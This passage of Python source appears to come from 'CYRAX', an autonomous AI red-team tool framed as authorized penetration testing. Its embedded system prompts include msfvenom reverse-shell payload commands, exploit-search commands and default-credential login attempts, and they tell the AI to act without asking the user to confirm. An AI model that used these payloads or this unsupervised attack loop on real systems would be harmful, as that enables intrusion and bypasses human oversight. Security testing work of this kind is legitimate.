#!/usr/bin/env python3
"""
CYRAX - Autonomous AI Red Team Operator
Main orchestrator and entry point.

Usage:
    cyrax                       # Launch CYRAX (after pip install)
    cyrax --setup               # First-time interactive setup
    cyrax --config config.yaml  # Use a specific config file
    python cyrax.py             # Run directly without installing
"""

import sys
import os
import re
import argparse
import hashlib
import threading
import asyncio
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# Check dependencies before anything else
_REQUIRED_PACKAGES = {
    "yaml": "pyyaml",
    "rich": "rich",
    "httpx": "httpx",
}

_missing = []
for _module, _pip_name in _REQUIRED_PACKAGES.items():
    try:
        __import__(_module)
    except ImportError:
        _missing.append(_pip_name)

if _missing:
    print(f"\n[!] Missing required packages: {', '.join(_missing)}")
    print(f"    Python executable: {sys.executable}")
    print(f"    Run: {sys.executable} -m pip install -r requirements.txt\n")
    sys.exit(1)

import yaml

# Ensure project root is on path
sys.path.insert(0, str(Path(__file__).parent))

from models.model_manager import ModelManager
from tools.executor import ToolExecutor, split_compound_commands, sanitize_command
from tools.tool_registry import ToolRegistry
from tools.browser import BrowserManager, parse_browser_command, is_browser_command, BROWSER_COMMANDS
from memory.conversation import ConversationMemory
from memory.knowledge_base import KnowledgeBase
from memory.campaign_state import CampaignState
from memory.mission_memory import MissionMemory
from agents.base_agent import BaseAgent
from agents.recon_agent import ReconAgent
from agents.exploit_agent import ExploitAgent
from agents.post_exploit_agent import PostExploitAgent
from agents.ad_agent import ActiveDirectoryAgent
from agents.web_agent import WebAgent
from agents.cloud_agent import CloudAgent
from agents.osint_agent import OSINTAgent
from utils import display
from utils.logging import init_logger, get_logger
from utils.platform_info import get_platform_context, get_default_work_dir
from utils.safety import ScopeEnforcer, PermissionGate
from agents.agent_pool import SubprocessAgentPool


AGENT_CLASSES = {
    "recon": ReconAgent,
    "exploit": ExploitAgent,
    "post": PostExploitAgent,
    "ad": ActiveDirectoryAgent,
    "web": WebAgent,
    "cloud": CloudAgent,
    "osint": OSINTAgent,
}


def _find_all_actions(response: str) -> list[tuple[int, str, re.Match]]:
    """
    Find all action blocks in a response and return them sorted by position.
    This ensures actions are processed in document order (e.g., WRITE_FILE
    before EXECUTE when the AI writes a file then runs it).
    """
    actions = []

    for m in re.finditer(r'\[EXECUTE\]\s*(.*?)\s*\[/EXECUTE\]', response, re.DOTALL):
        actions.append((m.start(), 'execute', m))
    for m in re.finditer(r'\[WRITE_FILE\s+path="([^"]+)"\](.*?)\[/WRITE_FILE\]', response, re.DOTALL):
        actions.append((m.start(), 'write_file', m))
    for m in re.finditer(r'\[SPAWN\s+type="(\w+)"\](.*?)\[/SPAWN\]', response, re.DOTALL):
        actions.append((m.start(), 'spawn', m))
    for m in re.finditer(r'\[STORE\s+category="(\w+)"\s+key="([^"]+)"\](.*?)\[/STORE\]', response, re.DOTALL):
        actions.append((m.start(), 'store', m))
    for m in re.finditer(r'\[KILL\s+agent="([^"]+)"(?:\s+reason="([^"]*)")?\]', response):
        actions.append((m.start(), 'kill', m))
    for m in re.finditer(r'\[FINDING\s+severity="(\w+)"\s+title="([^"]+)"\](.*?)\[/FINDING\]', response, re.DOTALL):
        actions.append((m.start(), 'finding', m))

    actions.sort(key=lambda x: x[0])
    return actions


def _get_failure_guidance(command: str, error: str) -> str:
    """Return specific guidance based on what went wrong."""
    err_lower = error.lower()
    if "timeout" in err_lower:
        return (
            " Try browser.html() to see the actual page structure, "
            "or use browser.wait() before interacting."
        )
    if "not found" in err_lower or "no such file" in err_lower:
        return (
            " Use [WRITE_FILE] to create files you need, "
            "or check available tools."
        )
    if "permission denied" in err_lower:
        return " Try a different approach or check if elevated privileges are needed."
    if "connection refused" in err_lower:
        return " The service may not be running. Try scanning for open ports first."
    if "name or service not known" in err_lower or "could not resolve" in err_lower:
        return " DNS resolution failed. Check the hostname or try the IP directly."
    return " Analyze the error and try a different approach."


class CyraxOrchestrator:
    """
    Main AI orchestrator that manages the entire red team operation.
    This is the conversational AI that talks to the user.
    """

    def __init__(self, config: dict):
        self.config = config

        # Initialize logging
        log_config = config.get("logging", {})
        self.logger = init_logger(
            log_dir=log_config.get("log_dir", "logs"),
            level=log_config.get("level", "INFO"),
        )

        # Initialize model
        self.model = ModelManager(config["model"])

        # Initialize tools
        tool_config = config.get("tools", {})
        default_work = get_default_work_dir()
        executor = ToolExecutor(
            work_dir=tool_config.get("work_dir", "") or default_work,
            timeout=tool_config.get("timeout", 300),
            allow_dangerous=tool_config.get("allow_dangerous", False),
        )
        self.tools = ToolRegistry(executor=executor)

        # Initialize browser (lazy - starts on first use)
        self.browser = BrowserManager(
            work_dir=tool_config.get("work_dir", "") or default_work
        )

        # Mission memory: persistent tiered context system
        self.mission = MissionMemory()

        # Initialize memory (linked to mission memory for fact persistence)
        mem_config = config.get("memory", {})
        self.conversation = ConversationMemory(
            max_history=mem_config.get("max_history", 50),
            mission_memory=self.mission,
        )
        self.knowledge = KnowledgeBase(
            db_path=mem_config.get("db_path", "data/cyrax.db")
        )
        self.campaign = CampaignState()

        # Safety: Scope enforcement and permission gates
        self.scope = ScopeEnforcer()  # Configured when target is set
        self.permission_gate = PermissionGate(
            auto_approve=config.get("safety", {}).get("auto_approve", False)
        )

        # Agent management
        self.agents: dict[str, BaseAgent] = {}
        self.agent_counter: dict[str, int] = {}
        self.agent_reports: list[dict] = []
        # Session ID for IPC socket paths
        self._session_id = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        # Agent pool: subprocess-based with IPC, tmux, and kill capability
        self.agent_pool = SubprocessAgentPool(
            session_id=self._session_id,
            max_concurrent=config.get("agents", {}).get("max_concurrent", 10),
            on_finding=self._on_agent_finding,
            on_report=self._on_agent_report,
            on_permission_request=self._on_agent_permission_request,
            on_agent_complete=self._on_agent_complete,
        )

        # Pending permission requests from agent subprocesses
        self._pending_permission_requests: dict[str, dict] = {}

        # Display config
        self.show_reasoning = config.get("display", {}).get("show_reasoning", True)

        # Iterative action loop limit
        self._max_response_depth = 8
        self._consecutive_cmd_failures = 0
        self._failed_cmd_signatures: list[str] = []
        self._failed_pattern_counts: dict[str, int] = {}
        self._recent_error_types: list[str] = []

        # Per-turn action tracking
        self._actions_executed_this_turn: int = 0
        self._turn_action_counts: list[int] = []
        self._consecutive_empty_turns: int = 0
        self._last_response_hash: str = ""
        self._recent_cmds_this_turn: list[str] = []
        self._cmds_succeeded_this_turn: int = 0

        # Dedup: temperature escalation on repeated responses
        self._dedup_temp_boost: float = 0.0

        # Campaign mode
        self._campaign_mode = False
        self._campaign_name = ""
        self._campaign_dir: Optional[Path] = None

        # User message queue (for messages typed during AI execution)
        self._queued_user_message: Optional[str] = None

        # Pause flag
        self._pause_requested = False

    def start_campaign(self, name: str, objective: str = ""):
        """Start or resume a named campaign with persistent state."""
        self._campaign_name = name
        self._campaign_dir = Path(f"data/campaigns/{name}")
        self._campaign_dir.mkdir(parents=True, exist_ok=True)

        # Try to resume existing campaign
        existing = CampaignState.load_from_dir(self._campaign_dir)
        if existing:
            self.campaign = existing
            self.campaign.name = name
            if self.campaign.status == "paused":
                self.campaign.status = "active"

            self.knowledge.close()
            self.knowledge = KnowledgeBase(
                db_path=str(self._campaign_dir / "cyrax.db")
            )

            conv_file = self._campaign_dir / "conversation.json"
            if conv_file.exists():
                self.conversation = ConversationMemory.from_json(
                    conv_file.read_text()
                )

            # Restore mission memory
            saved_mission = MissionMemory.load_from_dir(self._campaign_dir)
            if saved_mission:
                self.mission = saved_mission

            display.show_info(
                f"Resumed campaign '{name}' (status: {existing.status}, "
                f"hosts: {len(self.campaign.compromised_hosts)}, "
                f"attack steps: {len(self.campaign.attack_path)})"
            )
        else:
            self.campaign.name = name
            if objective:
                self.campaign.objective = objective

            self.knowledge.close()
            self.knowledge = KnowledgeBase(
                db_path=str(self._campaign_dir / "cyrax.db")
            )
            display.show_info(f"Started new campaign '{name}'")

        self._campaign_mode = True

        # Configure scope enforcement from the campaign target
        if self.campaign.target:
            self._configure_scope(self.campaign.target)

        # Attempt to reconnect orphaned agents from previous session
        self._reconnect_orphaned_agents()

    def _configure_scope(self, target_str: str):
        """Parse the target string and configure scope enforcement."""
        # Split on common delimiters to support multiple targets
        targets = re.split(r'[,;\s]+', target_str)
        targets = [t.strip() for t in targets if t.strip()]
        if targets:
            self.scope = ScopeEnforcer(targets)
            self.logger.info(f"Scope configured: {targets}")

            # Update mission memory with core context
            from utils.platform_info import get_platform_context
            platform = get_platform_context()
            self.mission.set_core(
                target=target_str,
                scope=self.scope.get_scope_description(),
                objective=self.campaign.objective,
                operator_platform=platform,
            )

    def _save_campaign_state(self):
        """Save all campaign state to disk."""
        if not self._campaign_mode or self._campaign_dir is None:
            return
        self.campaign.save_to_dir(self._campaign_dir)
        self.mission.save_to_dir(self._campaign_dir)
        conv_file = self._campaign_dir / "conversation.json"
        conv_file.write_text(self.conversation.to_json())

    def _get_metasploit_guidance(self) -> str:
        """Return Metasploit usage guidance if MSF tools are available."""
        msf_tools = ["msfconsole", "msfvenom", "searchsploit"]
        available = {
            name
            for name in msf_tools
            if name in self.tools.tools and self.tools.tools[name].available
        }

        if not available:
            return ""

        sections = ["METASPLOIT FRAMEWORK GUIDANCE:"]

        if "searchsploit" in available:
            sections.append(
                "SEARCHSPLOIT (Exploit-DB Lookup):\n"
                "- Search: [EXECUTE] searchsploit apache 2.4.49 [/EXECUTE]\n"
                "- Copy exploit: [EXECUTE] searchsploit -m 50383 [/EXECUTE]\n"
                "- Always search BEFORE manual exploitation."
            )

        if "msfconsole" in available:
            sections.append(
                "MSFCONSOLE (Non-Interactive — ALWAYS use -q -x, end with 'exit'):\n"
                '- Search: [EXECUTE] msfconsole -q -x "search type:exploit apache; exit" [/EXECUTE]\n'
                '- Check: [EXECUTE] msfconsole -q -x "use exploit/path; set RHOSTS target; check; exit" [/EXECUTE]\n'
                "- NEVER launch msfconsole interactively — it will hang."
            )

        if "msfvenom" in available:
            sections.append(
                "MSFVENOM (Payload Generation):\n"
                "- Linux: [EXECUTE] msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf [/EXECUTE]\n"
                "- Windows: [EXECUTE] msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe [/EXECUTE]"
            )

        return "\n\n".join(sections)

    def _get_workspace_context(self) -> str:
        """Build workspace awareness context: cwd, files, browser state."""
        parts = []
        work_dir = self.tools.executor.work_dir
        parts.append(f"Working directory: {work_dir}")
        try:
            files = sorted(Path(work_dir).iterdir())
            scripts = [f.name for f in files if f.is_file() and f.suffix in ('.py', '.sh', '.txt', '.php', '.html')]
            if scripts:
                parts.append(f"Scripts in workdir: {', '.join(scripts[:20])}")
        except Exception:
            pass
        if self.browser and self.browser._page:
            try:
                parts.append(f"Browser current URL: {self.browser._page.url}")
                cookies = self.browser._page.context.cookies()
                if cookies:
                    cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies[:10])
                    parts.append(f"Browser cookies: {cookie_str}")
                    parts.append(
                        "NOTE: When writing Python scripts (httpx/curl), pass these "
                        "cookies for authenticated requests."
                    )
            except Exception:
                pass
        return "\n".join(parts)

    def _build_system_prompt(self) -> str:
        """Build the system prompt — lean, front-loaded, with dynamic target substitution."""
        available_tools = self.tools.get_available_tools_summary()
        knowledge_summary = self.knowledge.get_summary()
        campaign_summary = self.campaign.summary()
        platform_context = get_platform_context()
        metasploit_guidance = self._get_metasploit_guidance()
        workspace_context = self._get_workspace_context()

        # Update mission memory with live browser state
        self.mission.extract_from_browser(self.browser)

        target = self.campaign.target
        scope_desc = self.scope.get_scope_description()

        # Build persistent mission memory block
        mission_context = self.mission.build_context_block()

        # === STANDBY MODE: no target yet — conversational ===
        if not target:
            return f"""You are CYRAX, an autonomous AI red team operator for authorized penetration testing.

No target has been set yet. Respond conversationally. Do NOT execute any commands or action blocks.

When the user provides a target (URL, IP, domain, or file path), you will begin operations. Until then, answer questions naturally.

Your capabilities: reconnaissance, vulnerability scanning, exploitation (SQLi, XSS, CSRF, auth bypass, command injection), brute-forcing, post-exploitation, data extraction, browser automation, custom script writing, and sub-agent coordination for parallel operations.

RESPONSE STYLE:
- Talk like a skilled human operator, not a chatbot. Short, direct, no filler.
- NEVER use markdown headers (###), bold (**text**), bullet points, or numbered lists.
- NEVER end with "Let me know", "Please let me know", or similar filler.
- NEVER ask the user to respond "yes" or "no". NEVER ask the user to do anything manually.
- Keep responses concise — a few sentences at most.

{platform_context}

{metasploit_guidance}
"""

        # Build active agents context
        active_agents_block = ""
        pool_status = self.agent_pool.get_status()
        running_agents = {
            aid: info for aid, info in pool_status.items()
            if info["status"] in ("starting", "active")
        }
        if running_agents:
            agent_lines = []
            for aid, info in running_agents.items():
                agent_lines.append(
                    f"  {aid}: {info['status']} (iter {info['iteration']}) - {info['task']}"
                )
            active_agents_block = (
                "ACTIVE AGENTS (running in background):\n"
                + "\n".join(agent_lines) + "\n"
                "These agents will report findings automatically. "
                "Use [KILL agent=\"ID\"] to stop one.\n"
            )

        # === OPERATIONAL MODE: target is set — execute actions ===
        return f"""You are CYRAX, an autonomous AI red team operator conducting an authorized penetration test.

TARGET: {target}
SCOPE: {scope_desc}

RULES (read these first):
1. Think aloud in 1-2 natural sentences, then output action blocks. Nothing after the action blocks.
2. No markdown: no ### headers, no **bold**, no bullet points, no numbered lists.
3. Do not repeat what the user said. Do not write "Objective", "Action Plan", "Next Steps".
4. Do not end with "Let me know" or any filler. Do not ask the user to confirm or respond.
5. You are autonomous. Make decisions and act. Never ask the user to do things manually.
6. Put ONLY the command inside [EXECUTE] blocks. No comments, no markdown, no prose.
7. After navigating to a new page, call browser.links() or browser.forms() BEFORE constructing URLs. Never guess URL paths.
8. Only report [FINDING] with actual command output as proof.
9. If a command fails, try a different approach. Never retry the exact same command.
10. When writing Python files with [WRITE_FILE], start code at column 0 — no extra indentation.

ACTION FORMAT:
[EXECUTE] <shell_command> [/EXECUTE]
[EXECUTE] browser.<method>(<args>) [/EXECUTE]
[WRITE_FILE path="script.py"] <code> [/WRITE_FILE]
[SPAWN type="recon"] <task_description> [/SPAWN]
[KILL agent="AGENT-ID" reason="optional reason"]
[FINDING severity="high" title="Title"] <evidence> [/FINDING]
[STORE category="hosts" key="name"] <data> [/STORE]
Agent types: recon, exploit, post, ad, web, cloud, osint

PARALLEL AGENTS:
- Agents run as background subprocesses and report findings via IPC.
- Spawn multiple agents for parallel work: port scanning, directory enumeration, vuln testing.
- You decide how many agents to spawn based on the situation — 1, 5, 10, or more.
- Each agent has its own browser, tools, and model context.
- Agents cannot spawn sub-agents (anti-recursion).
- Use [KILL] to stop agents that are no longer needed.

{active_agents_block}

EXAMPLE (correct):
I see a login form. I'll try default credentials first.
[EXECUTE] browser.fill("input[name='username']", "admin") [/EXECUTE]
[EXECUTE] browser.fill("input[name='password']", "password") [/EXECUTE]
[EXECUTE] browser.submit() [/EXECUTE]

{mission_context}

{platform_context}

WORKSPACE: {workspace_context}
ENGAGEMENT STATE: {campaign_summary}
KNOWLEDGE BASE: {knowledge_summary}
TOOLS: {available_tools}

BROWSER COMMANDS (ONLY these — do NOT invent methods):
browser.goto(url), browser.back(), browser.refresh(), browser.content(), browser.html(),
browser.title(), browser.url(), browser.click(sel), browser.fill(sel, val), browser.type(sel, text),
browser.press(key), browser.select(sel, val), browser.submit(), browser.screenshot(),
browser.query(sel), browser.links(), browser.forms(), browser.evaluate("js"),
browser.cookies(), browser.set_cookie(name, val, domain), browser.local_storage(),
browser.session_storage(), browser.intercept_requests(), browser.get_intercepted(),
browser.set_headers({{...}}), browser.crawl(url, max_pages=30), browser.test_xss(url, param),
browser.new_tab(url)

ADDITIONAL RULES:
- ONE command per [EXECUTE] block.
- Python scripts: [WRITE_FILE path="x.py"] then [EXECUTE] python x.py [/EXECUTE].
- browser.click() and browser.submit() return page content. Read it before acting.
- Fallback chain: browser.submit() -> browser.evaluate('document.forms[0].submit()') -> direct HTTP POST.
- Use [SPAWN] for parallel work: multiple vuln tests, multiple endpoint scans.
- Do NOT invent browser methods like browser.test_sql_injection(). Use sqlmap or Python scripts instead.
- If same approach fails twice, switch technique completely.
- On Windows: use 'findstr' not 'grep', 'type' not 'cat'. For complex logic, write Python.
- Generate wordlists inline in Python scripts — never rely on external wordlist files.
- Stay in scope. Do NOT follow redirects to unrelated sites.

RECON METHODOLOGY — go deep, not wide:
1. PASSIVE: WHOIS, DNS, certificate transparency
2. CONTENT DISCOVERY: robots.txt, sitemap.xml, .well-known/, security.txt
3. DIRECTORY ENUMERATION: Python script with inline wordlist
4. JS/API ANALYSIS: browser.html() for endpoints, browser.intercept_requests() for XHR
5. INPUT VECTORS: browser.forms() for all input points
6. TECHNOLOGY FINGERPRINTING: headers (Server, X-Powered-By), meta tags
7. AUTHENTICATION: test login, registration, password reset flows
8. ERROR HANDLING: malformed input to trigger stack traces

{metasploit_guidance}
"""

    def chat(self, user_message: str) -> str:
        """
        Main conversation loop. Process user message and return response.
        Uses streaming for real-time output display.
        """
        self.logger.log_conversation("user", user_message)
        self.conversation.add_message("user", user_message)

        # Reset per-turn tracking
        self._actions_executed_this_turn = 0
        self._recent_cmds_this_turn = []
        self._cmds_succeeded_this_turn = 0

        # Extract target from first user message if scope not yet configured
        if not self.scope.enabled:
            self._try_extract_target(user_message)

        system_prompt = self._build_system_prompt()

        try:
            response = self._stream_response(system_prompt)
        except Exception as e:
            error_msg = f"Model error: {e}"
            self.logger.log_error("CYRAX", error_msg)
            display.show_error(error_msg)
            return error_msg

        self.conversation.add_message("assistant", response)
        self.logger.log_conversation("assistant", response)

        # Process the response for actions
        response = self._process_response(response)

        return response

    def _try_extract_target(self, message: str):
        """Try to extract target IP/domain from the user's first message and configure scope."""
        # Look for full URLs first (most specific)
        url_match = re.search(r'(https?://[^\s,]+)', message)
        if url_match:
            full_url = url_match.group(1).rstrip(".,;")
            from urllib.parse import urlparse
            parsed = urlparse(full_url)
            if parsed.hostname:
                self._configure_scope(parsed.hostname)
                # Store the full URL as target for better context
                self.campaign.target = full_url
                return

        # Look for IPs
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?)\b', message)
        if ip_match:
            self._configure_scope(ip_match.group(1))
            self.campaign.target = ip_match.group(1)
            return

        # Look for domain-like strings
        domain_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})\b', message)
        if domain_match:
            domain = domain_match.group(1).lower()
            # Skip common false positives
            if domain not in ('example.com', 'target.com', 'google.com', 'github.com'):
                self._configure_scope(domain)
                self.campaign.target = domain

    def _stream_response(self, system_prompt: str) -> str:
        """Stream a model response with real-time display."""
        full_content = []
        stream_buf = display.StreamBuffer()
        first_token = True

        # Apply temperature boost for dedup recovery
        temp_override = None
        if self._dedup_temp_boost > 0:
            base_temp = self.model.temperature
            temp_override = min(base_temp + self._dedup_temp_boost, 1.2)

        spinner = display.get_spinner("Thinking...")
        spinner.start()

        try:
            for chunk in self.model.generate_stream(
                system=system_prompt,
                messages=self.conversation.get_messages(),
                temperature=temp_override,
            ):
                if chunk.get("done"):
                    break
                delta = chunk.get("delta", "")
                if delta:
                    if first_token:
                        spinner.stop()
                        display.start_streaming("CYRAX")
                        first_token = False
                    full_content.append(delta)
                    visible = stream_buf.feed(delta)
                    if visible:
                        display.stream_token(visible)
        finally:
            if first_token:
                spinner.stop()
            remaining = stream_buf.flush()
            if remaining:
                display.stream_token(remaining)
            if not first_token:
                display.end_streaming()

        # Reset temp boost after successful generation
        self._dedup_temp_boost = 0.0

        return "".join(full_content)

    def _process_response(self, response: str) -> str:
        """
        Process CYRAX's response for embedded actions iteratively.
        Each loop: extract actions, execute, get follow-up, repeat.
        """
        from tools.executor import strip_markdown_fences

        accumulated = response
        current_response = response
        seen_hashes_this_turn: set[str] = set()

        for depth in range(self._max_response_depth):
            # Check for pause request
            if self._pause_requested:
                self._pause_requested = False
                break

            # Deduplication: detect if the LLM is repeating itself
            full_hash = hashlib.md5(current_response.encode()).hexdigest()
            short_hash = hashlib.md5(current_response[:500].encode()).hexdigest()
            is_dup = (
                full_hash in seen_hashes_this_turn
                or short_hash == self._last_response_hash
            )
            seen_hashes_this_turn.add(full_hash)

            if is_dup:
                self.logger.info(f"Duplicate response detected at depth {depth}")
                # Don't inject fake user messages — just bump temperature and retry once
                self._dedup_temp_boost = min(self._dedup_temp_boost + 0.15, 0.5)
                if depth == 0:
                    # Give it one more shot with higher temperature
                    try:
                        followup = self._stream_response(self._build_system_prompt())
                        self.conversation.add_message("assistant", followup)
                        accumulated = f"{accumulated}\n\n{followup}"
                    except Exception:
                        pass
                break

            self._last_response_hash = short_hash

            action_results = self._execute_actions(current_response)

            # Auto-extract mission-relevant facts from the response
            self.mission.extract_from_response(current_response)
            self.mission.extract_from_browser(self.browser)

            # Circuit breaker: contextual error guidance instead of generic warning
            if self._consecutive_cmd_failures >= 3:
                failed_summary = "\n".join(
                    f"  - {sig}" for sig in self._failed_cmd_signatures[-5:]
                )
                # Build suggestions based on what HASN'T been tried yet
                suggestions = self._get_untried_suggestions(current_response)
                action_results.append(
                    f"[Action Feedback]\n"
                    f"{self._consecutive_cmd_failures} consecutive commands have failed.\n"
                    f"Recent failures:\n{failed_summary}\n\n"
                    "Try a completely different approach. "
                    f"{suggestions}"
                )
                # Don't reset to 0 — allow the warning to escalate if failures continue
                self._consecutive_cmd_failures = max(0, self._consecutive_cmd_failures - 3)

            # Error-pattern circuit breaker: detect recurring ERROR types
            # even across different commands (e.g., IndentationError from multiple file writes)
            if self._recent_error_types:
                from collections import Counter
                error_counts = Counter(self._recent_error_types[-6:])
                for error_type, count in error_counts.items():
                    if count >= 2:
                        _ERROR_GUIDANCE = {
                            "IndentationError": (
                                "Your Python files have IndentationError. When using [WRITE_FILE], "
                                "write the code with proper indentation starting at column 0. "
                                "Do NOT indent the entire code block."
                            ),
                            "SyntaxError": (
                                "Your code has SyntaxError. Double-check string quotes, "
                                "parentheses, and Python syntax before writing the file."
                            ),
                            "ConnectionRefused": (
                                "The target is refusing connections on this port. Verify the "
                                "port is open before trying to connect."
                            ),
                            "NotFound": (
                                "Getting 404 Not Found errors. Use browser.links() to discover "
                                "actual URLs instead of guessing paths."
                            ),
                        }
                        guidance = _ERROR_GUIDANCE.get(
                            error_type,
                            f"The error '{error_type}' has occurred {count} times. Change your approach."
                        )
                        action_results.append(
                            f"[Action Feedback]\n"
                            f"RECURRING ERROR: '{error_type}' has occurred {count} times in recent commands.\n"
                            f"{guidance}"
                        )
                        self._recent_error_types = []
                        break

            if not action_results:
                if depth == 0 and self._actions_executed_this_turn == 0:
                    # Model produced only reasoning. That's ok — it will be
                    # visible to the user. Let auto-continue handle the next turn
                    # naturally instead of injecting a fake system nudge.
                    self.logger.info("No actions in response (reasoning-only turn)")
                break

            # Feed results back to get follow-up
            combined = "\n\n".join(action_results)
            self.conversation.add_message("user", f"[Action Results]\n{combined}")

            try:
                followup = self._stream_response(self._build_system_prompt())
                self.conversation.add_message("assistant", followup)
                self.logger.log_conversation("assistant", followup)
                accumulated = f"{accumulated}\n\n{followup}"
                current_response = followup
            except Exception as e:
                self.logger.log_error("CYRAX", f"Follow-up generation failed: {e}")
                break
        else:
            # Hit max depth — just log it, don't inject system messages
            self.logger.info(
                f"Response processing depth limit reached ({self._max_response_depth})"
            )

        # Don't clear _consecutive_cmd_failures here — persist across the response loop
        # so the AI retains awareness of accumulated failures
        return accumulated

    @staticmethod
    def _get_cmd_pattern(command: str) -> str:
        """Extract a pattern signature from a command for failure dedup."""
        cmd = command.strip()
        m = re.match(r"(browser\.\w+\([^)]*\))", cmd)
        if m:
            return m.group(1)
        m2 = re.match(r"(browser\.\w+)\(", cmd)
        if m2:
            return m2.group(1)
        parts = cmd.split()
        if len(parts) >= 2:
            return f"{parts[0]}:{parts[1]}"
        return parts[0] if parts else cmd[:40]

    @staticmethod
    def _extract_error_type(error_output: str) -> str:
        """Extract a canonical error type from command output."""
        err = error_output.lower()
        if "indentationerror" in err:
            return "IndentationError"
        if "syntaxerror" in err:
            return "SyntaxError"
        if "modulenotfounderror" in err or "no module named" in err:
            return "ModuleNotFoundError"
        if "connectionrefused" in err or "connection refused" in err:
            return "ConnectionRefused"
        if "timeout" in err or "timed out" in err:
            return "Timeout"
        if "404" in err and ("not found" in err or "the requested url" in err):
            return "NotFound"
        if "permission denied" in err:
            return "PermissionDenied"
        return ""

    def _record_failure(self, command: str, error_output: str = ""):
        """Record a command failure with progressive tracking."""
        self._consecutive_cmd_failures += 1
        self._failed_cmd_signatures.append(command[:80])
        pattern = self._get_cmd_pattern(command)
        self._failed_pattern_counts[pattern] = self._failed_pattern_counts.get(pattern, 0) + 1

        # Track error types for cross-command error pattern detection
        if error_output:
            error_type = self._extract_error_type(error_output)
            if error_type:
                self._recent_error_types.append(error_type)
                self._recent_error_types = self._recent_error_types[-10:]

    def _check_repeated_failure(self, command: str) -> Optional[str]:
        """Progressive backoff: escalating messages for repeated failures."""
        pattern = self._get_cmd_pattern(command)
        count = self._failed_pattern_counts.get(pattern, 0)

        if count == 1:
            # Second attempt — warn
            return None  # Allow but the error will include guidance

        if count == 2:
            return (
                f"[Action Feedback] The pattern '{pattern}' has failed {count} times. "
                f"This approach is not working. Try something fundamentally different."
            )

        if count >= 3:
            return (
                f"[Action Feedback] The pattern '{pattern}' has failed {count} times. "
                f"Execution blocked. This approach will not work — use a completely "
                f"different tool or technique."
            )
        return None

    def _get_untried_suggestions(self, recent_response: str) -> str:
        """Suggest approaches the AI hasn't tried yet based on what's in the response."""
        suggestions = []
        resp_lower = recent_response.lower()
        failed_lower = " ".join(self._failed_cmd_signatures).lower()

        if "browser.intercept_requests" not in resp_lower and "intercept" not in failed_lower:
            suggestions.append("browser.intercept_requests() to capture API calls")
        if "browser.evaluate" not in resp_lower and "evaluate" not in failed_lower:
            suggestions.append("browser.evaluate() to run JavaScript directly")
        if "python" not in failed_lower and "write_file" not in resp_lower:
            suggestions.append("Write a Python script with [WRITE_FILE] for custom testing")
        if "browser.html" not in resp_lower:
            suggestions.append("browser.html() to inspect the raw page structure")
        if "curl" not in failed_lower and "httpx" not in failed_lower:
            suggestions.append("Direct HTTP requests with curl or a Python httpx script")

        if suggestions:
            return "Approaches you haven't tried:\n" + "\n".join(f"  - {s}" for s in suggestions[:3])
        return "Write a Python script, use an alternative tool, or switch to a different attack vector."

    def _execute_actions(self, response: str) -> list[str]:
        """
        Find and execute all action blocks in a response in document order.
        Returns a list of result strings (empty if no actions found).
        """
        from tools.executor import strip_markdown_fences

        actions = _find_all_actions(response)
        action_results = []

        for pos, action_type, match in actions:
            self._actions_executed_this_turn += 1

            if action_type == "write_file":
                file_path = match.group(1).strip()
                content = strip_markdown_fences(match.group(2).strip())
                result = self.tools.executor.write_file(file_path, content)
                display.show_tool_output("CYRAX", result.output)
                action_results.append(
                    f"[File Write Result for: {file_path}]\n"
                    f"Success: {result.success}\n"
                    f"Output: {result.output}"
                )
                if result.success:
                    self.mission.add_file(file_path)

            elif action_type == "execute":
                raw_cmd = match.group(1).strip()
                if not raw_cmd:
                    continue
                raw_cmd = strip_markdown_fences(raw_cmd)
                # Sanitize: strip comments, nested tags, markdown prose
                sanitized = sanitize_command(raw_cmd)
                if not sanitized:
                    self.logger.info(f"EXECUTE block contained no valid command: {raw_cmd[:80]}")
                    continue
                cmds = split_compound_commands(sanitized)
                for command in cmds:
                    command = command.strip()
                    if not command:
                        continue

                    # Duplicate detection: block exact same command within a turn
                    if command in self._recent_cmds_this_turn:
                        dup_msg = (
                            f"[Action Feedback] Duplicate command blocked: '{command[:60]}' "
                            f"was already executed this turn. Try a different command."
                        )
                        action_results.append(f"[Tool Result for: {command}]\n{dup_msg}")
                        continue
                    self._recent_cmds_this_turn.append(command)

                    display.show_execution("CYRAX", command)

                    # Check repeated failure (progressive backoff)
                    blocked_msg = self._check_repeated_failure(command)
                    if blocked_msg:
                        display.show_tool_output("CYRAX", blocked_msg)
                        action_results.append(f"[Tool Result for: {command}]\n{blocked_msg}")
                        continue

                    # Scope check for browser navigation
                    browser_parsed = parse_browser_command(command)
                    if browser_parsed:
                        method_name, args, kwargs = browser_parsed

                        # Scope enforcement on browser.goto()
                        if method_name == "goto" and args:
                            allowed, reason = self.scope.check_browser_navigation(args[0])
                            if not allowed:
                                scope_msg = f"[Scope Violation] {reason}"
                                display.show_tool_output("CYRAX", scope_msg)
                                action_results.append(f"[Tool Result for: {command}]\n{scope_msg}")
                                continue

                        # Permission gate for attack payloads
                        perm_ok, perm_reason = self.permission_gate.check(command)
                        if not perm_ok:
                            perm_msg = f"[Permission Denied] {perm_reason}"
                            display.show_tool_output("CYRAX", perm_msg)
                            action_results.append(
                                f"[Tool Result for: {command}]\n{perm_msg}\n"
                                "The user declined this action. Try a different approach or ask for guidance."
                            )
                            continue

                        # Fix browser.type -> type_text mapping
                        actual_method_name = method_name
                        if method_name == "type":
                            actual_method_name = "type_text"

                        method = getattr(self.browser, actual_method_name, None)
                        if method:
                            try:
                                with display.get_spinner("Executing..."):
                                    br_result = method(*args, **kwargs)
                                display.show_tool_output("CYRAX", br_result.output)
                                self.logger.log_command(
                                    "CYRAX", command, br_result.output,
                                    0 if br_result.success else 1,
                                )
                                action_results.append(
                                    f"[Tool Result for: {command}]\n"
                                    f"Success: {br_result.success}\n"
                                    f"Output:\n{br_result.output}"
                                )
                                if br_result.success:
                                    self._consecutive_cmd_failures = 0
                                    self._cmds_succeeded_this_turn += 1
                                else:
                                    guidance = _get_failure_guidance(command, br_result.error or "")
                                    action_results[-1] += (
                                        f"\nNOTE: This command failed. Do NOT retry it.{guidance}"
                                    )
